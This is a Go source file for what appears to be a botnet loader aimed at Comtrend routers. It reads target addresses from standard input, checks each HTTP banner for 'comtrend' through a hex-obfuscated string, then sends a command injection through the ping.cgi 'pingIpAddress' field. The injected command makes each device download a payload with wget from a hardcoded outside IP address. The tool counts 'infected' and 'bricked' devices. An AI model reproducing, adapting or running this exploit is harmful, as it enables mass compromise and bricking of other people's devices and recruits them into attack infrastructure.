package main

import (
	"bufio"
	"fmt"
	"net"
	"net/http"
	"os"
	"strings"
	"time"
)

var infectedDevice int
var verifiedDevice int
var notDevice int
var brickedDevice int
var total int

func exploit(host string, port string) {
	payload := "wget%20http%3A%2F%2F107.172.86.42%2F0day_wget_test"
	evil := fmt.Sprintf("http://%s:%s/\x2f\x70\x69\x6e\x67\x2e\x63\x67\x69\x3f\x70\x69\x6e\x67\x49\x70\x41\x64\x64\x72\x65\x73\x73\x3d\x67\x6f\x6f\x67\x6c\x65\x2e\x66\x72\x3b", host, port) + payload + "\x26\x73\x65\x73\x73\x69\x6f\x6e\x4b\x65\x79\x3d\x31\x30"
	fmt.Printf("%s\n", evil)
	conn, err := http.Get(evil)
	if err != nil {
		notDevice++
		recover()
		return
	}
	switch conn.StatusCode {
	case 200:
		infectedDevice++
		break
	case 404:
		brickedDevice++
		break
	default:
		notDevice++
		break
	}
	conn.Body.Close()
}
func checkDevice(host string, port string) {
	total++
	conn, err := net.Dial("tcp", fmt.Sprintf("%s:%s", host, port))
	if err != nil {
		notDevice++
		recover()
		return
	}
	fmt.Fprintf(conn, "GET / HTTP/1.1\r\nHost: %s\r\n\r\n", host)
	recvdata := make([]byte, 128)
	conn.Read(recvdata)

	if strings.Contains(strings.ToLower(string(recvdata)), strings.ToLower("\x63\x6f\x6d\x74\x72\x65\x6e\x64")) == true {
		verifiedDevice++
		exploit(host, port)
		conn.Close()
		return
	} else {
		notDevice++
		conn.Close()
		return
	}
}
func main() {
	if len(os.Args) != 2 {
		fmt.Printf("\033[31m[\033[37mUSAGE\033[31m] \033[37m%s \033[31m[\033[37mdevice-port\033[31m]\033[0m\n", os.Args[0])
		return
	}
	port := os.Args[1]
	fmt.Printf("\033[31m[\033[37mROUTERBRAND-0day\033[31m]\033[37m Coded by urmommy with anti honeypot\n")
	time.Sleep(1)
	var i int = 0
	go func() {
		for {
			fmt.Printf("\033[37m%d\033[31m'\033[37ms \033[31m-\033[37m Not a Device\033[31m:\033[37m %d \033[31m-\033[37m Verified device\033[31m:\033[37m %d \033[31m-\033[37m Infected\033[31m:\033[37m %d \033[31m-\033[37m Bricked\033[31m:\033[37m %d \033[31m-\033[37m Total\033[31m:\033[37m %d\n", i, notDevice, verifiedDevice, infectedDevice, brickedDevice, total)
			time.Sleep(1 * time.Second)
			i++
		}
	}()
	for {
		reader := bufio.NewReader(os.Stdin)
		address := bufio.NewScanner(reader)
		for address.Scan() {
			go checkDevice(address.Text(), port)
		}
	}
}
